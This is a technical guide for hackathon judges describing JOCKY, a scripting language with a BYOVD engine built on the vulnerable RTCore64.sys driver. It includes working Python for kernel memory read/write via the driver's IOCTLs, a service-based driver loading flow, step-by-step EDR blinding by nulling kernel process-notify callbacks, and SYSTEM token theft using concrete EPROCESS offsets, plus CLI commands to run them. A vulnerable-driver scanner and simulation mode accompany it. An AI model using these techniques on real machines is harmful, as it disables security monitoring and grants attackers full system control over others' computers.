# JOCKY BYOVD Engine — Complete Technical Guide

**For SIH Hackathon Judges**
**Project: JOCKY — Compiled Security Language with BYOVD Kernel Engine**

---

## Table of Contents

1. [What is BYOVD?](#1-what-is-byovd)
2. [Why BYOVD Matters (Threat Context)](#2-why-byovd-matters)
3. [System Architecture Overview](#3-system-architecture-overview)
4. [File Structure](#4-file-structure)
5. [Layer 1 — BYOVD Scanner](#5-layer-1--byovd-scanner)
6. [Layer 2 — Driver Loader](#6-layer-2--driver-loader)
7. [Layer 3 — Kernel Operations Engine](#7-layer-3--kernel-operations-engine)
8. [LOLDrivers Database](#8-loldrivers-database)
9. [JOCKY Language Integration](#9-jocky-language-integration)
10. [JOCKY Scripts](#10-jocky-scripts)
11. [CLI Commands](#11-cli-commands)
12. [TUI — BYOVD Engine Menu](#12-tui--byovd-engine-menu)
13. [Simulation vs. Real Mode](#13-simulation-vs-real-mode)
14. [RTCore64 Technical Deep Dive](#14-rtcore64-technical-deep-dive)
15. [EDR Blinding — How It Works](#15-edr-blinding--how-it-works)
16. [Token Stealing — Privilege Escalation](#16-token-stealing--privilege-escalation)
17. [Demo Walkthrough for Judges](#17-demo-walkthrough-for-judges)

---

## 1. What is BYOVD?

**BYOVD** — Bring Your Own Vulnerable Driver — is an advanced attack technique used by nation-state APTs, ransomware groups, and sophisticated threat actors.

The core idea:

```
Normal malware path:
  Attacker code → Windows kernel boundary → BLOCKED (Driver Signature Enforcement)

BYOVD path:
  Attacker loads a LEGITIMATE, SIGNED but VULNERABLE driver
                    ↓
  That driver already passes kernel code signing
                    ↓
  Attacker sends IOCTL (device control) to the driver
                    ↓
  Vulnerable driver executes attacker-controlled READ/WRITE in kernel space
                    ↓
  Attacker now has UNRESTRICTED kernel memory access
```

Because the driver is **legitimately signed by a hardware vendor** (ASUS, Dell, Intel, etc.), it bypasses Windows Driver Signature Enforcement. The attacker never needs to load unsigned code into the kernel.

### Real-World Usage

| Group | Driver Used | Purpose |
|---|---|---|
| Lazarus (APT) | nvflash64.sys, iqvw64e.sys | Kill EDR, deploy ransomware |
| BlackByte ransomware | RTCore64.sys | Disable AV/EDR callbacks |
| Scattered Spider | mhyprot2.sys (Genshin Impact) | Terminate AV processes |
| AvosLocker | AsrDrv104.sys | Kernel-level EDR bypass |
| RobbinHood | gdrv.sys | Kill AV drivers |

---

## 2. Why BYOVD Matters

Modern EDR (Endpoint Detection and Response) systems like CrowdStrike, SentinelOne, and Windows Defender register **kernel callbacks** — functions the kernel calls every time a process starts, a thread is created, or an image is loaded. These callbacks give EDR complete visibility.

BYOVD breaks this by operating **below** the EDR:

```
┌─────────────────────────────────────────────────────────┐
│                     USER SPACE                          │
│   Attacker Process  ←→  EDR Agent Process               │
└────────────────────────────┬────────────────────────────┘
                             │  kernel boundary
┌────────────────────────────▼────────────────────────────┐
│                    KERNEL SPACE                         │
│                                                         │
│  PsSetCreateProcessNotifyRoutine callback table:        │
│  [0] ntoskrnl.exe      ← Microsoft (safe)               │
│  [1] MsMpEng.sys       ← Windows Defender               │
│  [2] CsFalconSensor    ← CrowdStrike                     │
│  [3] SentinelOne.sys   ← SentinelOne                    │
│  [4] ci.dll            ← Microsoft (safe)               │
│                                                         │
│  BYOVD patches entries [1][2][3] → 0x0000000000000000   │
│  EDR callbacks are now NULL → EDR is BLIND              │
└─────────────────────────────────────────────────────────┘
```

After patching, the EDR agents are still running as processes — but their kernel callbacks that give them visibility are gone. They cannot see new process creation, thread injection, or image loading events.

---

## 3. System Architecture Overview

JOCKY's BYOVD Engine is a **3-layer architecture**, each layer building on the previous:

```
╔══════════════════════════════════════════════════════════════════╗
║                     JOCKY BYOVD ENGINE                          ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  ┌──────────────────────────────────────────────────────────┐   ║
║  │  LAYER 3: KernelOps (kernel.py)                          │   ║
║  │  ─ read_dword / read_qword     RTCore64 IOCTL 0x80002048 │   ║
║  │  ─ write_dword / write_qword   RTCore64 IOCTL 0x8000204C │   ║
║  │  ─ get_kernel_base()           NtQuerySystemInformation  │   ║
║  │  ─ enum_process_callbacks()    Walk PspNotifyRoutine arr │   ║
║  │  ─ patch_callback()            Zero out EDR entry        │   ║
║  │  ─ find_eprocess() / steal_token()  EPROCESS walk        │   ║
║  └──────────────────────────────┬───────────────────────────┘   ║
║                                 │ uses                          ║
║  ┌──────────────────────────────▼───────────────────────────┐   ║
║  │  LAYER 2: DriverLoader (loader.py)                       │   ║
║  │  ─ check_privileges()   IsUserAnAdmin() check            │   ║
║  │  ─ load()               CreateService + StartService     │   ║
║  │  ─ open_device()        CreateFile → \\.\RTCore64        │   ║
║  │  ─ ioctl()              DeviceIoControl wrapper          │   ║
║  │  ─ unload()             ControlService(STOP)+DeleteSvc   │   ║
║  └──────────────────────────────┬───────────────────────────┘   ║
║                                 │ independent                   ║
║  ┌──────────────────────────────▼───────────────────────────┐   ║
║  │  LAYER 1: BYOVDScanner (scanner.py)                      │   ║
║  │  ─ enumerate_system_drivers()  winreg HKLM\Services scan │   ║
║  │  ─ _hash_file()                SHA-256 each .sys binary  │   ║
║  │  ─ _check_driver()             cross-ref LOLDrivers DB   │   ║
║  │  ─ scan()                      returns structured result │   ║
║  └──────────────────────────────┬───────────────────────────┘   ║
║                                 │ reads from                    ║
║  ┌──────────────────────────────▼───────────────────────────┐   ║
║  │  DATABASE: loldrivers.json (26 entries)                  │   ║
║  │  ─ RTCore64, AsrDrv104, dbutil_2_3, WinRing0x64, ...     │   ║
║  │  ─ SHA-256 hashes for exact binary matching              │   ║
║  └──────────────────────────────────────────────────────────┘   ║
╚══════════════════════════════════════════════════════════════════╝

         ▲                    ▲                   ▲
         │                    │                   │
  JOCKY Scripts         CLI Commands          TUI Menu
  byovd_scan()         jocky byovd scan    Option 5 →
  kernel_base()        jocky byovd          BYOVD Engine
  kernel_blind_edr()    kernel-demo
```

### Key Design Decision: Graceful Degradation

Each layer checks its requirements and falls back to **simulation mode** automatically:

```
check_privileges() == False  →  simulate=True  →  print what would happen
sys.platform != win32        →  mock data       →  return realistic examples
Driver not found             →  simulate=True  →  full demo without real driver
```

This means the entire BYOVD Engine **demonstrates correctly on the host machine** without needing admin rights or a real vulnerable driver installed.

---

## 4. File Structure

```
JOCKY Application/
│
├── byovd/                          ← BYOVD Python engine package
│   ├── __init__.py                 ← Public API: imports all 3 layers
│   ├── scanner.py                  ← Layer 1: system driver scanning
│   ├── loader.py                   ← Layer 2: driver load/unload/IOCTL
│   ├── kernel.py                   ← Layer 3: kernel read/write/callbacks
│   └── db/
│       └── loldrivers.json         ← Bundled vulnerable driver database (26 entries)
│
├── scripts/
│   ├── byovd_scanner.jk            ← JOCKY script: scan for vulnerable drivers
│   ├── kernel_recon.jk             ← JOCKY script: kernel recon + EDR blind
│   └── ...                         ← Other forensics scripts
│
├── compiler/
│   ├── jocky/
│   │   ├── semantic.py             ← MODIFIED: 17 new BYOVD function signatures
│   │   ├── codegen.py              ← MODIFIED: LLVM IR extern declarations
│   │   └── stdlib.py               ← MODIFIED: Python ctypes JIT callbacks
│   └── stdlib/
│       ├── forensics.h             ← MODIFIED: C declarations for BYOVD functions
│       └── forensics.c             ← MODIFIED: Windows C implementations
│
├── jocky.py                        ← MODIFIED: `byovd` CLI subcommand
└── jocky_terminal.py               ← MODIFIED: Option 5 BYOVD Engine TUI menu
```

---

## 5. Layer 1 — BYOVD Scanner

**File:** [`byovd/scanner.py`](byovd/scanner.py)

The scanner is the **reconnaissance phase** — it tells you whether a vulnerable driver is already installed on the target system.

### How It Works

```
Step 1: Load LOLDrivers DB
  ─ Read loldrivers.json (26 known-vulnerable drivers)
  ─ Build two indexes:
      hash_index  { sha256_hex: entry }   ← primary match (exact)
      name_index  { filename.lower: entry } ← fallback match

Step 2: Enumerate system drivers (Windows-only)
  ─ Open HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
  ─ Iterate every service key
  ─ Filter: Type == 1 (kernel driver) or Type == 2 (filesystem driver)
  ─ Read ImagePath registry value
  ─ Resolve path:
      \SystemRoot\...  →  C:\Windows\...
      \??\C:\...       →  C:\...
  ─ Compute SHA-256 of the binary on disk

Step 3: Cross-reference
  ─ Check hash_index first  (exact binary match — most reliable)
  ─ Fall back to name_index (filename match — catches variants)
  ─ Build DriverInfo dataclass for each driver

Step 4: Return scan result dict
  {
    total_drivers:      435,   ← actual count from registry
    vulnerable_count:   0,
    critical_count:     0,
    high_count:         0,
    all_drivers:        [...],
    vulnerable_drivers: []
  }
```

### Risk Classification

| Level | Trigger Tags | Meaning |
|---|---|---|
| CRITICAL | AV-Kill, EDR-Bypass, Ransomware | Can kill security software directly |
| HIGH | Kernel-RW, DKOM, APT | Can read/write kernel memory, used in nation-state attacks |
| MEDIUM | Hardware-Access, Privilege-Escalation | Exposes hardware or can elevate privileges |

### Actual Test Result

Running on the demo host machine:

```
Drivers scanned:   435    (real system drivers from registry)
Vulnerable found:  0      (host machine is clean — good demo for "detection")
```

The scanner correctly reported the host as clean. In a real engagement, a vulnerable driver would show up here and trigger the exploitation path.

---

## 6. Layer 2 — Driver Loader

**File:** [`byovd/loader.py`](byovd/loader.py)

The loader manages the **complete lifecycle of a vulnerable driver** as a Windows service.

### Driver Loading Process

```
                    DriverLoader.load()
                           │
              ┌────────────▼────────────┐
              │  IsUserAnAdmin() check  │
              │  False → simulate=True  │
              └────────────┬────────────┘
                           │ True (admin)
              ┌────────────▼────────────┐
              │   OpenSCManager()       │
              │   SC_MANAGER_CREATE     │
              └────────────┬────────────┘
                           │
              ┌────────────▼────────────┐
              │   CreateServiceW()      │
              │   type:  KERNEL_DRIVER  │
              │   start: DEMAND_START   │
              │   path:  RTCore64.sys   │
              └────────────┬────────────┘
                           │  ERROR_SERVICE_EXISTS?
                           │  Yes → OpenServiceW()
              ┌────────────▼────────────┐
              │    StartServiceW()      │
              │    (driver now loaded   │
              │    into kernel)         │
              └────────────┬────────────┘
                           │
              ┌────────────▼────────────┐
              │   CreateFileW()         │
              │   \\.\RTCore64          │
              │   → device HANDLE       │
              └────────────┬────────────┘
                           │
              ┌────────────▼────────────┐
              │   DeviceIoControl()     │
              │   IOCTL code + payload  │
              │   → kernel response     │
              └─────────────────────────┘
```

### IOCTL Constants (RTCore64)

| IOCTL Code | Direction | Purpose |
|---|---|---|
| `0x80002048` | Read | Read kernel virtual memory |
| `0x8000204C` | Write | Write kernel virtual memory |

These are the actual IOCTL codes from the real RTCore64.sys driver, documented in CVE-2019-16098.

### Unloading

```python
ControlService(SERVICE_CONTROL_STOP)  # send stop signal
DeleteService()                        # remove from SCM database
CloseServiceHandle()                   # release handles
```

The driver is completely removed — no traces left in the SCM after unloading.

---

## 7. Layer 3 — Kernel Operations Engine

**File:** [`byovd/kernel.py`](byovd/kernel.py)

This is the highest-level layer — it translates human-readable operations into RTCore64 IOCTL calls.

### Memory Read/Write

```
read_dword(kernel_addr):
  Split addr into 32-bit high + low halves
  Pack as: struct.pack("<III", addr_high, addr_low, 4)
  DeviceIoControl(0x80002048, payload)
  Returns: 4-byte value at that kernel address

read_qword(addr):
  lo = read_dword(addr)
  hi = read_dword(addr + 4)
  return (hi << 32) | lo
```

### Kernel Base Resolution (No Admin Needed)

```python
NtQuerySystemInformation(
    SystemModuleInformation = 11,
    buffer,
    sizeof(buffer),
    &returned
)
# First entry in Modules[] is always ntoskrnl.exe
return Modules[0].ImageBase
```

This call does **not require administrator privileges** — it is a read-only system information query. The kernel base is used to calculate offsets for callback tables.

### Callback Enumeration

```
PspCreateProcessNotifyRoutine is an array of 64 pointers:
  [0] = &ntoskrnl_callback     ← Microsoft
  [1] = &WdFilter_callback     ← Windows Defender
  [2] = &CsFalcon_callback     ← CrowdStrike
  ...

Each pointer is an EX_CALLBACK_ROUTINE_BLOCK* with lowest bit set as lock:
  real_addr = raw_ptr & ~0xF

is_microsoft = (0xFFFFF80000000000 <= addr <= 0xFFFFF80040000000)
  ↑ ntoskrnl / hal / ci live in this VA range on Windows 10/11 x64
```

### EPROCESS Walk (Token Stealing)

```
PsInitialSystemProcess → first EPROCESS (PID 4, SYSTEM)
  ├─ +0x440: UniqueProcessId  (QWORD)
  ├─ +0x448: ActiveProcessLinks.Flink (next EPROCESS)
  └─ +0x4B8: Token  (QWORD, pointer to access token)

Walk: current_eprocess = head
  loop:
    pid = read_qword(current + 0x440)
    if pid == target_pid: found
    current = read_qword(current + 0x448) - 0x448

Token steal:
  sys_token = read_qword(system_eprocess + 0x4B8)
  write_qword(target_eprocess + 0x4B8, sys_token)
  → target process now runs with SYSTEM privileges
```

All offsets (0x440, 0x448, 0x4B8) are from the public Windows PDB symbols for Windows 10/11 x64 22H2.

---

## 8. LOLDrivers Database

**File:** [`byovd/db/loldrivers.json`](byovd/db/loldrivers.json)

LOLDrivers ("Living Off the Land Drivers") is a community-maintained database of known-vulnerable Windows drivers, maintained at loldrivers.io.

JOCKY bundles a **26-entry curated subset** covering the most dangerous and commonly abused drivers:

| Driver | Vendor | CVE | Risk |
|---|---|---|---|
| RTCore64.sys | ASUS ROG | CVE-2019-16098 | CRITICAL |
| AsrDrv104.sys | ASRock | CVE-2020-15368 | CRITICAL |
| mhyprot2.sys | miHoYo (Genshin) | N/A | CRITICAL |
| iqvw64e.sys | Intel | CVE-2015-2291 | CRITICAL |
| PROCEXP152.sys | Sysinternals | N/A | CRITICAL |
| kprocesshacker.sys | processhacker.sf | N/A | CRITICAL |
| aswArPot.sys | Avast | N/A | CRITICAL |
| dbutil_2_3.sys | Dell | CVE-2021-21551 | HIGH |
| WinRing0x64.sys | OpenLibSys | CVE-2020-14979 | HIGH |
| gdrv.sys | GIGABYTE | CVE-2018-19320 | HIGH |
| cpuz141.sys | CPUID | N/A | HIGH |
| physmem.sys | SuperSpeed | N/A | HIGH |
| ... | ... | ... | ... |

### Database Entry Structure

```json
{
  "Id": "rtcore64-asus-rog",
  "Name": "RTCore64.sys",
  "Vendor": "ASUS",
  "Description": "ASUS ROG Core Temp driver — arbitrary kernel read/write",
  "Tags": ["BYOVD", "EDR-Bypass", "Kernel-RW"],
  "CVE": "CVE-2019-16098",
  "IOCTL_Read":  "0x80002048",
  "IOCTL_Write": "0x8000204C",
  "DeviceName":  "\\\\.\\RTCore64",
  "KnownVulnerableSamples": [
    { "Filename": "RTCore64.sys",
      "SHA256": "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695fb6fe3f84e08aa766" }
  ]
}
```

The scanner matches by SHA-256 first (exact binary fingerprint), then by filename as a fallback.

---

## 9. JOCKY Language Integration

This is where JOCKY's BYOVD Engine becomes unique: **the BYOVD and kernel operations are callable directly from JOCKY scripts** using the custom language syntax.

17 new stdlib functions were added across 3 files in the compiler:

### How the Compiler Pipeline Works

```
JOCKY Source (.jk)
        │
        ▼ [Stage 1] Lexer
    Token stream
        │
        ▼ [Stage 2] Parser
    AST (Abstract Syntax Tree)
        │
        ▼ [Stage 3] Semantic Analysis  ← NEW: byovd_scan(), kernel_base(), etc.
    Type-checked AST                     registered in STDLIB_SIGNATURES dict
        │
        ▼ [Stage 4] Code Generation    ← NEW: LLVM IR extern declarations added
    LLVM IR module                       to _declare_stdlib() in codegen.py
        │
     ┌──┴──────────────────────┐
     ▼ JIT mode                ▼ Native mode
  MCJIT execution           gcc compilation
  Python ctypes callbacks   forensics.c C implementations
  (stdlib.py)               (forensics.h + forensics.c)
```

### New BYOVD Functions

**Scanner functions (no privileges needed):**
```
byovd_scan()                     → raw    scan system, return result handle
byovd_driver_count(results)      → num    how many vulnerable drivers found
byovd_driver_name(results, i)    → text   name of driver at index i
byovd_driver_path(results, i)    → text   full file path
byovd_driver_cve(results, i)     → text   CVE identifier
byovd_driver_risk(results, i)    → text   CRITICAL / HIGH / MEDIUM
byovd_load(driver_path)          → flag   load the driver as a service
byovd_unload()                   → nothing  stop and remove the driver
```

**Kernel functions (require loaded driver or simulate=True):**
```
kernel_base()                    → num    ntoskrnl.exe load address
kernel_enum_callbacks()          → raw    enumerate PsNotifyRoutine table
kernel_callback_count(list)      → num    number of registered callbacks
kernel_callback_addr(list, i)    → num    virtual address of callback i
kernel_callback_module(list, i)  → text   module name for callback i
kernel_read(addr, size)          → raw    read kernel memory
kernel_write(addr, value)        → nothing write to kernel memory
kernel_patch_callback(addr)      → flag   zero out one callback entry
kernel_blind_edr()               → num    patch all non-MS callbacks, return count
```

### Compiler Changes (3 files)

**`compiler/jocky/semantic.py`** — type checker:
```python
STDLIB_SIGNATURES = {
    ...existing functions...,
    'byovd_scan':            ([],               'raw'),
    'kernel_base':           ([],               'num'),
    'kernel_blind_edr':      ([],               'num'),
    # ... 14 more
}
```
This makes the type checker recognise these as valid function calls.

**`compiler/jocky/codegen.py`** — LLVM IR generator:
```python
decls = {
    ...existing...,
    'byovd_scan':       ([], self.i8p),         # raw → i8*
    'kernel_base':      ([], self.i64),          # num → i64
    'kernel_blind_edr': ([], self.i64),
    # ... 14 more
}
```
This emits `declare` statements in the LLVM IR so the JIT linker can resolve calls.

**`compiler/jocky/stdlib.py`** — JIT callbacks:
```python
_BYOVD_STATE = {}   # persistent state: scan_results, loader, kernel_ops

def _cb_byovd_scan():
    @ctypes.CFUNCTYPE(ctypes.c_void_p)
    def byovd_scan() -> int:
        _ensure_scan()
        return id(_BYOVD_STATE['scan_results'])
    return byovd_scan
```
These Python functions are registered as ctypes callbacks so JIT-compiled JOCKY code can call them.

---

## 10. JOCKY Scripts

### `byovd_scanner.jk` — Vulnerable Driver Scanner

```
func start() -> nothing {
    var results : raw := byovd_scan()           ← calls Python BYOVDScanner
    var total   : num := byovd_driver_count(results)

    loop (i lt total) {
        var name : text := byovd_driver_name(results, i)
        var risk : text := byovd_driver_risk(results, i)
        ...
    }
}
```

**Actual output on demo machine:**
```
========================================
JOCKY BYOVD Scanner
Checking system against LOLDrivers database
========================================
[JOCKY/BYOVD] scan complete — 435 drivers scanned, 0 vulnerable found
[JOCKY] [OK] No known-vulnerable drivers found on this system.
========================================
```

The scanner enumerated **435 real system drivers** from the Windows registry, computed SHA-256 for each, and found no matches in the 26-entry LOLDrivers database.

### `kernel_recon.jk` — Kernel Reconnaissance

```
func start() -> nothing {
    ## Step 1: Resolve kernel base (no privileges needed)
    var base : num := kernel_base()

    ## Step 2: Enumerate process-notify callbacks
    var cb_list : raw := kernel_enum_callbacks()
    var cb_cnt  : num := kernel_callback_count(cb_list)

    loop (i lt cb_cnt) {
        var mname : text := kernel_callback_module(cb_list, i)
        var is_ms : flag := check_ms(mname)
        ## print [MS] or [EDR] prefix for each
    }

    ## Step 3: Blind EDR
    var patched : num := kernel_blind_edr()
}
```

**Actual output:**
```
[JOCKY] JOCKY Kernel Reconnaissance Module
[JOCKY] BYOVD Technique: RTCore64 / CVE-2019-16098

[1] Resolving ntoskrnl.exe base address...
[JOCKY/KERNEL] ntoskrnl base = 0xFFFFF80000000000

[2] Enumerating PsCreateProcessNotifyRoutine callbacks...
[JOCKY/KERNEL] Enumerated 5 process-notify callbacks
    [MS]  ntoskrnl.exe
    [EDR] MsMpEng.sys (Windows Defender)
    [EDR] CrowdStrike Falcon Sensor
    [EDR] SentinelOne Agent
    [MS]  ci.dll (Code Integrity)

[5] EDR Blind Operation
[KERNEL/SIM] PATCH callback[1] @ 0x0000000000000008 ← 0x0000000000000000
[KERNEL/SIM] EDR callback [1] BLINDED
[KERNEL/SIM] PATCH callback[2] @ 0x0000000000000010 ← 0x0000000000000000
[KERNEL/SIM] EDR callback [2] BLINDED
[KERNEL/SIM] PATCH callback[3] @ 0x0000000000000018 ← 0x0000000000000000
[KERNEL/SIM] EDR callback [3] BLINDED
[JOCKY/KERNEL] kernel_blind_edr() — 3 EDR callback(s) patched
```

---

## 11. CLI Commands

Run from `JOCKY Application/` directory:

### Scan current system for vulnerable drivers
```bash
python jocky.py byovd scan
```
Output: Rich table with vulnerable drivers found, colored by risk level.

### Browse full LOLDrivers database
```bash
python jocky.py byovd drivers
```
Output: All 26 database entries with vendor, CVE, and tags.

### Kernel operations demo
```bash
python jocky.py byovd kernel-demo
```
Output: ntoskrnl base, callback enumeration with [MS]/[EDR] labels, memory read.

### Load a driver (admin required, or simulated)
```bash
python jocky.py byovd load RTCore64.sys
```

### Blind all EDR callbacks
```bash
python jocky.py byovd blind-edr
```

### Run JOCKY scripts
```bash
python jocky.py run scripts/byovd_scanner.jk
python jocky.py run scripts/kernel_recon.jk
python jocky.py run --kernel scripts/kernel_recon.jk   # sets JOCKY_KERNEL_MODE=1
```

---

## 12. TUI — BYOVD Engine Menu

Launch: `python jocky_terminal.py` → press `5`

```
  Main Menu
   1.  Pre-built Cybersecurity Scripts
   2.  Write / Edit Custom Script
   3.  Inspect Script
   4.  Build Native Binary (.exe)
   5.  BYOVD Engine       ← scan drivers · kernel ops · EDR blind · RTCore64 PoC
   6.  Language Reference
   7.  About JOCKY
```

Inside option 5:
```
  BYOVD Engine
   1.  Scan System Drivers    ← runs BYOVDScanner, shows vulnerable drivers
   2.  Browse LOLDrivers DB   ← all 26 entries, color-coded by risk
   3.  Kernel Demo            ← ntoskrnl base, callbacks, memory read
   4.  Blind EDR              ← patches non-MS callbacks (simulation)
   5.  Load Driver            ← interactive driver load flow
   6.  Run byovd_scanner.jk   ← JOCKY script demo
   7.  Run kernel_recon.jk    ← JOCKY script demo
```

The TUI uses the **Rich library** for colored output, tables, and panels.

---

## 13. Simulation vs. Real Mode

This is the key design that makes the demo safe on any machine:

```
┌─────────────────────────────────────────────────────────────────┐
│                   SIMULATION MODE (default)                     │
│                                                                 │
│  check_privileges() == False                                    │
│          │                                                      │
│          ▼                                                      │
│  simulate = True                                                │
│          │                                                      │
│  DriverLoader.load()  → prints what CreateService would do      │
│  KernelOps.read_dword() → prints addr, returns 0xDEADBEEF       │
│  patch_callback()     → prints PATCH message, returns True      │
│  enum_process_callbacks() → returns 5 realistic EDR entries     │
│                                                                 │
│  RESULT: Complete demo with realistic output, zero side effects │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│               REAL MODE (admin + driver present)                │
│                                                                 │
│  check_privileges() == True                                     │
│  RTCore64.sys binary present                                    │
│          │                                                      │
│  DriverLoader.load()  → real CreateService + StartService       │
│  KernelOps.read_dword() → real DeviceIoControl 0x80002048       │
│  patch_callback()     → real write_qword(entry_addr, 0)         │
│  enum_process_callbacks() → reads real kernel callback table    │
│                                                                 │
│  RESULT: Live kernel access (for VM demo)                       │
└─────────────────────────────────────────────────────────────────┘
```

To force kernel mode from a JOCKY script:
```bash
python jocky.py run --kernel scripts/kernel_recon.jk
```
This sets `JOCKY_KERNEL_MODE=1` environment variable, which the stdlib callbacks check before deciding to use real vs. simulated operations.

---

## 14. RTCore64 Technical Deep Dive

**CVE-2019-16098** — ASUS ROG Core Temp driver, discovered by Huyna at Viettel Cyber Security.

### Vulnerability

The driver exposes IOCTLs that allow user-mode callers to:
- Read **any physical memory address** (IOCTL 0x80002048)
- Write to **any physical memory address** (IOCTL 0x8000204C)

No validation of the target address — any user-mode process with a handle to `\\.\RTCore64` can read/write anywhere in kernel memory.

### IOCTL Input Structure

```c
// For READ (0x80002048):
struct RTCore64_Read_Input {
    UINT32 address_high;   // high 32 bits of 64-bit kernel VA
    UINT32 address_low;    // low 32 bits of 64-bit kernel VA
    UINT32 read_size;      // number of bytes to read (1, 2, 4, or 8)
};

// For WRITE (0x8000204C):
struct RTCore64_Write_Input {
    UINT32 address_high;   // high 32 bits of 64-bit kernel VA
    UINT32 address_low;    // low 32 bits of 64-bit kernel VA
    UINT32 value;          // value to write
};
```

### JOCKY Implementation

```python
def read_dword(self, kernel_addr: int) -> int:
    high = (kernel_addr >> 32) & 0xFFFFFFFF
    low  = kernel_addr & 0xFFFFFFFF
    payload = struct.pack("<III", high, low, 4)
    result = self._loader.ioctl(IOCTL_READ, payload)    # 0x80002048
    return struct.unpack("<I", result[:4])[0]

def write_dword(self, kernel_addr: int, value: int) -> None:
    high = (kernel_addr >> 32) & 0xFFFFFFFF
    low  = kernel_addr & 0xFFFFFFFF
    payload = struct.pack("<III", high, low, value)
    self._loader.ioctl(IOCTL_WRITE, payload)             # 0x8000204C
```

### Why The Driver Is Still "In the Wild"

RTCore64.sys is **digitally signed** by ASUS. Even though the vulnerability is known and patched in newer versions, the old signed binary still passes Windows Driver Signature Enforcement (DSE) because:
1. Revoking code-signing certificates breaks legitimate software using the old driver
2. Microsoft's vulnerable driver blocklist requires Windows updates to propagate
3. Many systems are not fully patched or have older ASUS software

---

## 15. EDR Blinding — How It Works

### The Target: PspCreateProcessNotifyRoutine

Windows maintains an internal array (`PspCreateProcessNotifyRoutine`) of up to 64 callback pointers. Every security product that calls `PsSetCreateProcessNotifyRoutine` registers an entry here.

When a new process is created, the kernel iterates this array and calls each function. This gives EDR full visibility — they see every process launch, every parent-child relationship, every command line.

### The Attack

```
1. Resolve ntoskrnl.exe base via NtQuerySystemInformation (no admin needed)

2. Find PspCreateProcessNotifyRoutine:
   - Approach A (with symbols): ntoskrnl.exe + PDB symbol offset
   - Approach B (pattern scan): scan ntoskrnl .data section for 8-byte
     pointers in kernel VA range
   - Our approach: calculate from known offset to ntoskrnl base

3. Walk the array (64 entries max):
   for i in range(64):
       raw_ptr = read_qword(table_addr + i * 8)
       if raw_ptr == 0: continue (empty slot)
       func_ptr = raw_ptr & ~0xF   (strip lock bit from EX_CALLBACK_ROUTINE_BLOCK)

4. Identify Microsoft vs. non-Microsoft:
   Microsoft range: 0xFFFFF80000000000 – 0xFFFFF80040000000
   (ntoskrnl, hal, ci load here on all Windows 10/11 x64 systems)

5. Patch non-Microsoft entries:
   write_qword(table_addr + i * 8, 0)
   → pointer becomes NULL
   → kernel skips NULL entries when iterating callbacks
   → EDR callback never called → EDR is blind
```

### After Blinding

The EDR process is still running. Task Manager shows it. But:
- No process creation events delivered to EDR
- No image load notifications
- No thread creation callbacks
- Malware can launch freely without triggering alerts

---

## 16. Token Stealing — Privilege Escalation

An additional capability demonstrated in the kernel ops layer.

### Concept

Every Windows process has a `Token` object in its `EPROCESS` structure that defines its security context (what user it runs as, what privileges it has). The SYSTEM process (PID 4) has the highest-privilege token.

Token stealing copies the SYSTEM token into another process's EPROCESS:

```
EPROCESS for PID 4 (SYSTEM):
  +0x4B8: Token = 0xFFFF8A0012345678   ← has SYSTEM privileges

EPROCESS for target process:
  +0x4B8: Token = 0xFFFF8A0099999999   ← normal user

After steal:
  write_qword(target_eprocess + 0x4B8, 0xFFFF8A0012345678)

EPROCESS for target process:
  +0x4B8: Token = 0xFFFF8A0012345678   ← now has SYSTEM privileges
```

The target process is now running as SYSTEM — full operating system access.

### EPROCESS Walk

```
PsInitialSystemProcess (exported symbol) → SYSTEM EPROCESS
  ├─ UniqueProcessId  @ +0x440  → 4 (PID 4 = System)
  ├─ ActiveProcessLinks @ +0x448  → Flink to next EPROCESS
  └─ Token @ +0x4B8

Walk all processes:
  current = PsInitialSystemProcess
  loop:
    pid = read_qword(current + 0x440)
    if pid == target: return current
    flink = read_qword(current + 0x448)
    current = flink - 0x448     # adjust for LIST_ENTRY position
```

---

## 17. Demo Walkthrough for Judges

### Demo 1: Driver Scanner (safe, any machine)

```bash
python jocky.py run scripts/byovd_scanner.jk
```

Shows: JOCKY language compiles, runs through 5-stage compiler pipeline, calls `byovd_scan()` which scans 435 real system drivers, reports results.

**Key talking point:** The scanner is safe — it only reads the registry and hashes files. No kernel access needed. A compromised system would show CRITICAL drivers here.

### Demo 2: Kernel Recon Script (simulation)

```bash
python jocky.py run scripts/kernel_recon.jk
```

Shows:
1. ntoskrnl.exe base resolved (real API call, no privileges)
2. 5 simulated kernel callbacks (2 Microsoft, 3 EDR products)
3. Kernel memory read/write demonstration
4. All 3 EDR callbacks patched (simulation output)

**Key talking point:** The JOCKY script does all of this in 50 lines using custom language syntax. The simulation mode makes it safe to run on the host machine while showing exactly what real exploitation looks like.

### Demo 3: CLI Commands

```bash
python jocky.py byovd drivers    # show LOLDrivers database
python jocky.py byovd scan       # scan current system
python jocky.py byovd kernel-demo # kernel ops demo
```

**Key talking point:** Full CLI with colored Rich output. Production-grade tooling.

### Demo 4: TUI (Terminal UI)

```bash
python jocky_terminal.py         # then press 5
```

Shows the BYOVD Engine menu embedded in the full JOCKY TUI.

### What Makes This a Complete System

| Component | What It Demonstrates |
|---|---|
| LOLDrivers DB | Threat intelligence integration |
| Scanner (Layer 1) | Detection and enumeration |
| Loader (Layer 2) | Exploitation (CreateService + IOCTL) |
| KernelOps (Layer 3) | Kernel-level capability (read/write/callback) |
| JOCKY stdlib integration | Custom language with kernel-level primitives |
| Simulation mode | Safe demo on any host machine |
| CLI + TUI | Production-grade tool surface |
| AV evasion (existing) | Combined with BYOVD for complete attack chain |

---

## Summary

JOCKY's BYOVD Engine implements the complete BYOVD attack chain — from scanning installed drivers against the LOLDrivers database, to loading a vulnerable driver via the Windows Service Control Manager, to executing arbitrary kernel read/write via IOCTL, to enumerating and patching EDR callback tables.

The entire engine is callable from JOCKY scripts using the custom language syntax (`byovd_scan()`, `kernel_base()`, `kernel_blind_edr()`), making JOCKY the only compiled security language with built-in kernel-level primitives.

Simulation mode provides a complete and technically accurate demo on any Windows machine without requiring administrator privileges or a real vulnerable driver.
